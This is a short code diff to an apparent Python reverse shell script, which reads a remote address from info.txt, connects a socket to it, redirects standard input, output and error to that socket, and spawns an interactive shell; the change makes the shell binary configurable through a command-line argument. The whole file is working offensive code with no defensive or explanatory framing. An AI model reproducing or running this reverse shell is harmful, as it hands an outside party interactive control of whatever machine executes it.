@@ -1,6 +1,8 @@
-import socket,subprocess,os
+import socket,subprocess,os, sys
 
 dat = None
+
+shell_path = sys.argv[1]
 
 with open("info.txt") as f:
     raw = f.read()
@@ -13,5 +15,5 @@ s.connect(dat)
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
-p=subprocess.call(["/bin/bash","-i"])
+p=subprocess.call([shell_path,"-i"])
 print("Connection got hecked")
